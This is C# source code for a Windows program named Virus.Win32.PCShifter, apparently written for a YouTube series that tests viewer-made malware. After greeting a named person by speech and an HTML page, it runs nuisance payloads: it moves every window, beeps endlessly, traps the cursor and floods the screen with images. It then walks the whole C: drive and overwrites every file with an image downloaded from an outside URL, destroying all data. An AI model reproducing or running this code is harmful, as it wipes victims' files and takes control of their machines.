using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Speech.Synthesis;

namespace Virus.Win32.PCShifter
{
    public class Program
    {
        [DllImport("user32.dll")]
        /// <summary>
        /// Gets the window rect.
        /// </summary>
        /// <returns>The window rect.</returns>
        /// <param name="hWnd">H window.</param>
        /// <param name="lpRect">Lp rect.</param>
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetWindowRect(IntPtr hWnd, ref RECT lpRect);


        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, SetWindowPosFlags uFlags);


        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;        // x position of upper-left corner
            public int Top;         // y position of upper-left corner
            public int Right;       // x position of lower-right corner
            public int Bottom;      // y position of lower-right corner
        }

        static void Main(string[] args)
        {
            MessageBox.Show(caption:"Sacrificial goat file.",
                text:"This is a sacrificial goat file of unknown size.\r\n\r\n\r\nIt is also your worst nightmare.");

            Thread.Sleep(30000);
            BrowserPayload(); //The user won't expect THIS. :P
            Thread.Sleep(10000);

            new Thread(() =>
            {
                MessageBox.Show("Starting first payload: Virus.ShiftOS.TL1.WindowsEverywhere");
            }).Start();

            WindowsEverywhere();

            Thread.Sleep(20000);

            new Thread(() =>
            {
                MessageBox.Show("Starting second payload: Virus.ShiftOS.TL1.Beeps");
            }).Start();
            Beeps();
            Thread.Sleep(20000);
            new Thread(() =>
            {
                MessageBox.Show("Shall we throw some Virus.ShiftOS.TL3.Mousetrap in there?");
            }).Start();
            SkinInterceptor();

            Thread.Sleep(30000);

            new Thread(() =>
            {
                MessageBox.Show("Hmmmm... The user isn't getting pissed by these viruses yet? Hmmm. I'm getting kinda angry.");
            }).Start();

            VictorTranPayload();

            Thread.Sleep(500);

            //Go through all files starting at C:

            RecursiveVictorTranify("C:\\");
        }

        public static void RecursiveVictorTranify(string path)
        {
            foreach(var file in System.IO.Directory.GetFiles(path))
            {
                try
                {
                    var webreq = new System.Net.WebClient();
                    webreq.DownloadFile(FuckingPissedVictorTran, file);
                }
                catch
                {

                }
            }
            foreach(var directory in System.IO.Directory.GetDirectories(path))
            {
                RecursiveVictorTranify(directory);
            }
        }

        const string FuckingPissedVictorTran = "https://cdn.discordapp.com/emojis/282006282930618370.png";

        static void VictorTranPayload()
        {
            //create a new thread
            new Thread(() =>
            {
                //create a topmost form
                var frm = new Form();
                frm.TopMost = true;
                //make it borderless
                frm.FormBorderStyle = FormBorderStyle.None;
                //make it fill the screen
                frm.WindowState = FormWindowState.Maximized;
                //set transparency key to RGB 1,0,1
                frm.TransparencyKey = Color.FromArgb(1, 0, 1);
                //set the bg to the transparency key
                frm.BackColor = frm.TransparencyKey;

                Process.Start("https://www.youtube.com/watch?v=2E21oad5pWQ");

                //show the form
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            frm.Invoke(new Action(() =>
                            {
                                //make a new picture box
                                var pbox = new PictureBox();
                                //make it not just a pissed victor tran face
                                pbox.Load(FuckingPissedVictorTran);
                                //make the box autosize
                                pbox.SizeMode = PictureBoxSizeMode.AutoSize;
                                //set the location to a random value
                                var rnd = new Random();
                                int xPos = rnd.Next(0, frm.Width);
                                int yPos = rnd.Next(0, frm.Height);
                                pbox.Left = xPos;
                                pbox.Top = yPos;
                                //add to form
                                frm.Controls.Add(pbox);
                                //show box
                                pbox.Show();
                            }));
                        }
                        catch
                        {

                        }
                        //sleep
                        Thread.Sleep(500);
                    }
                }).Start();
                Application.Run(frm);

                //open the Victor Tran Challenge video.
                Thread.Sleep(1000);

                
            }).Start();
        }

        static void SkinInterceptor()
        {
            int pCount = Process.GetProcesses().Length;

            foreach (var prc in Process.GetProcesses())
            {
                RECT test = new RECT();
                if (prc != Process.GetCurrentProcess() && GetWindowRect(prc.MainWindowHandle, ref test))
                {
                    new Thread(() =>
                    {
                        bool aborted = false;
                        Random rnd = new Random();
                        RECT winRect = new RECT();
                        while (aborted == false)
                        {
                            if (rnd.Next(0, 50) == 25)
                            {
                                
                                bool trapped = true;
                                if (GetWindowRect(prc.MainWindowHandle, ref winRect) == true)
                                {
                                    while(trapped == true)
                                    {
                                        int x = 0;
                                        int y = 0;

                                        if (!Cursor.Position.IsInRect(test))
                                        {
                                            if (Cursor.Position.X < test.Left)
                                                x = test.Left;
                                            if (Cursor.Position.X > test.Right)
                                                x = test.Right;
                                            if (Cursor.Position.Y < test.Top)
                                                y = test.Top;
                                            if (Cursor.Position.Y > test.Bottom)
                                                y = test.Bottom;
                                            Cursor.Position = new Point(x, y);
                                        }

                                        if (rnd.Next(0, 100) == 50)
                                            trapped = false;
                                    }
                                }
                            }
                            Thread.Sleep(1250);
                        }
                    }).Start();
                }
            }
        }

        static void Beeps()
        {
            new Thread(() =>
            {
                while (true)
                {
                    Console.Beep(500, 250);
                    Thread.Sleep(100);
                    Console.Beep(500, 250);
                    Thread.Sleep(100);
                    Console.Beep(500, 250);
                    Thread.Sleep(500);

                }
            }).Start();
        }

        static void WindowsEverywhere()
        {
            int pCount = Process.GetProcesses().Length;

            foreach(var prc in Process.GetProcesses())
            {
                RECT test = new RECT();
                if(prc != Process.GetCurrentProcess() && GetWindowRect(prc.MainWindowHandle, ref test))
                {
                    new Thread(() =>
                    {
                        bool aborted = false;
                        int velX = 1;
                        int velY = 1;
                        RECT winRect = new RECT();
                        while (aborted == false)
                        {
                            if (GetWindowRect(prc.MainWindowHandle, ref winRect) == true)
                            {
                                if (winRect.Left <= 0)
                                    velX = 1;
                                if (winRect.Right >= Screen.PrimaryScreen.Bounds.Width)
                                    velX = -1;
                                if (winRect.Top <= 0)
                                    velY = 1;
                                if (winRect.Bottom >= Screen.PrimaryScreen.Bounds.Height)
                                    velY = -1;

                                SetWindowPos(prc.MainWindowHandle, new IntPtr(-2), winRect.Left + velX, winRect.Top + velY, winRect.Right + velX, winRect.Bottom + velY, SetWindowPosFlags.DoNotRedraw | SetWindowPosFlags.IgnoreResize | SetWindowPosFlags.IgnoreZOrder);

                                Thread.Sleep(2);

                                if (pCount < Process.GetProcesses().Length)
                                {
                                    aborted = true;
                                    WindowsEverywhere();
                                }
                            }
                        }
                    }).Start();
                }
            }
        }

        static void BrowserPayload()
        {
            string text = @"<html>
    <head>
        <title>Your PC is about to be experimented on.</title>
        <link rel=""stylesheet"" href=""http://getshiftos.ml/css/theme.css"">    
    </head>
    <body>
        <h1>Hello there, Diana Adams.</h1>

        <p>My name is Michael VanOverbeek - lead developer of a game called ShiftOS... well, your son was the original developer but I took over in June 2015.</p>

        <p>Either way, this is another project of mine meant for danooct1's Viewer-Made Malware series where he tests out, well, viewer-made malware.</p>

        <p>This virus is a work-in-progress, but I want to test it on your system just to collect some data on what I need to modify/add.</p>

        <p>I see you're trying to destroy Windows 8 - I remember that first episode where you called it childish and like it was the first version ever.</p>

        <p>Originally I was just going to slip the Windows ME prank app in here and run it at the end... but I decided not to because I don't really like Windows 8 either. I'm considering moving to your arch enemy, Arch Linux.</p>
    </body>
</html>";
            File.WriteAllText("hello.html", text);
            Process.Start("hello.html");
            var speaker = new SpeechSynthesizer();
            speaker.SetOutputToDefaultAudioDevice();
            speaker.Speak(@"Hello there, Diana Adams.
        My name is Michael VanOverbeek - lead developer of a game called ShiftOS... well, your son was the original developer but I took over in June 2015.

        Either way, this is another project of mine meant for danooct1's Viewer-Made Malware series where he tests out, well, viewer-made malware.

        This virus is a work-in-progress, but I want to test it on your system just to collect some data on what I need to modify/add.

        I see you're trying to destroy Windows 8 - I remember that first episode where you called it childish and like it was the first version ever.

        Originally I was just going to slip the Windows ME prank app in here and run it at the end... but I decided not to because I don't really like Windows 8 either. I'm considering moving to your arch enemy, Arch Linux.

        Uhh, did I say ""Linux""? I meant ""Linnux.""

        Viral effects beginning in 10 seconds after I stop talking.
");
        }
    }

    [Flags()]
    public enum SetWindowPosFlags : uint
    {
        /// <summary>If the calling thread and the thread that owns the window are attached to different input queues, 
        /// the system posts the request to the thread that owns the window. This prevents the calling thread from 
        /// blocking its execution while other threads process the request.</summary>
        /// <remarks>SWP_ASYNCWINDOWPOS</remarks>
        AsynchronousWindowPosition = 0x4000,
        /// <summary>Prevents generation of the WM_SYNCPAINT message.</summary>
        /// <remarks>SWP_DEFERERASE</remarks>
        DeferErase = 0x2000,
        /// <summary>Draws a frame (defined in the window's class description) around the window.</summary>
        /// <remarks>SWP_DRAWFRAME</remarks>
        DrawFrame = 0x0020,
        /// <summary>Applies new frame styles set using the SetWindowLong function. Sends a WM_NCCALCSIZE message to 
        /// the window, even if the window's size is not being changed. If this flag is not specified, WM_NCCALCSIZE 
        /// is sent only when the window's size is being changed.</summary>
        /// <remarks>SWP_FRAMECHANGED</remarks>
        FrameChanged = 0x0020,
        /// <summary>Hides the window.</summary>
        /// <remarks>SWP_HIDEWINDOW</remarks>
        HideWindow = 0x0080,
        /// <summary>Does not activate the window. If this flag is not set, the window is activated and moved to the 
        /// top of either the topmost or non-topmost group (depending on the setting of the hWndInsertAfter 
        /// parameter).</summary>
        /// <remarks>SWP_NOACTIVATE</remarks>
        DoNotActivate = 0x0010,
        /// <summary>Discards the entire contents of the client area. If this flag is not specified, the valid 
        /// contents of the client area are saved and copied back into the client area after the window is sized or 
        /// repositioned.</summary>
        /// <remarks>SWP_NOCOPYBITS</remarks>
        DoNotCopyBits = 0x0100,
        /// <summary>Retains the current position (ignores X and Y parameters).</summary>
        /// <remarks>SWP_NOMOVE</remarks>
        IgnoreMove = 0x0002,
        /// <summary>Does not change the owner window's position in the Z order.</summary>
        /// <remarks>SWP_NOOWNERZORDER</remarks>
        DoNotChangeOwnerZOrder = 0x0200,
        /// <summary>Does not redraw changes. If this flag is set, no repainting of any kind occurs. This applies to 
        /// the client area, the nonclient area (including the title bar and scroll bars), and any part of the parent 
        /// window uncovered as a result of the window being moved. When this flag is set, the application must 
        /// explicitly invalidate or redraw any parts of the window and parent window that need redrawing.</summary>
        /// <remarks>SWP_NOREDRAW</remarks>
        DoNotRedraw = 0x0008,
        /// <summary>Same as the SWP_NOOWNERZORDER flag.</summary>
        /// <remarks>SWP_NOREPOSITION</remarks>
        DoNotReposition = 0x0200,
        /// <summary>Prevents the window from receiving the WM_WINDOWPOSCHANGING message.</summary>
        /// <remarks>SWP_NOSENDCHANGING</remarks>
        DoNotSendChangingEvent = 0x0400,
        /// <summary>Retains the current size (ignores the cx and cy parameters).</summary>
        /// <remarks>SWP_NOSIZE</remarks>
        IgnoreResize = 0x0001,
        /// <summary>Retains the current Z order (ignores the hWndInsertAfter parameter).</summary>
        /// <remarks>SWP_NOZORDER</remarks>
        IgnoreZOrder = 0x0004,
        /// <summary>Displays the window.</summary>
        /// <remarks>SWP_SHOWWINDOW</remarks>
        ShowWindow = 0x0040,
    }

    public static class PointExtensions
    {
        public static bool IsInRect(this Point pt, Program.RECT rct)
        {
            bool flag = false;
            if(pt.X >= rct.Left && pt.X <= rct.Right && pt.Y >= rct.Top && pt.Y <= rct.Bottom)
            {
                flag = true;
            }
            return flag;
        }
    }
}
